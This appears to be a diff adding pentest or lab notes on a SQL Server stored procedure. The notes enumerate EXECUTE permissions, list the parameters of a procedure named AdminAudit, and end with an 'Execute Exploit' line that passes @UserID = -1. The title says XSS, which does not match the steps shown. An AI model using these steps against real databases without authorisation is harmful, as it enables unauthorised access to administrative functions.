@@ -1,0 +1,42 @@
+
+
+XSS in Stored Procedure
+
+-check for current user EXECUTE perms on SP
+SELECT * FROM sys.fn_my_permissions(NULL, 'DATABASE') 
+WHERE permission_name = 'EXECUTE';
+
+
+--check for current role EXECUTE perms on SP
+SELECT 
+    dp.name AS PrincipalName,
+    dp.type_desc AS PrincipalType,
+    o.name AS ProcedureName,
+    p.permission_name AS Permission,
+    p.state_desc AS PermissionState
+FROM sys.database_permissions p
+JOIN sys.database_principals dp ON p. grantee_principal_id = dp.principal_id
+JOIN sys.objects o ON p.major_id = o.object_id
+WHERE p.permission_name = 'EXECUTE'
+  AND o.type = 'P' -- 'P' filters for Stored Procedures
+ORDER BY dp.name;
+
+confirms that JP has successfully inherited the EXECUTE perm from role
+
+--SP definition, inputs
+SELECT 
+    p.name AS ParameterName,
+    TYPE_NAME(p.user_type_id) AS DataType,
+    p.max_length,
+    p.is_output AS IsOutput,
+    p.has_default_value,
+    p.default_value
+FROM sys.parameters AS p
+JOIN sys.procedures AS pr ON p.object_id = pr.object_id
+WHERE pr.name = 'AdminAudit';
+
+--Execute SP
+EXEC dbo.AdminAudit @UserID = 1;
+
+--Execute Exploit
+EXEC dbo.AdminAudit @UserID = -1;
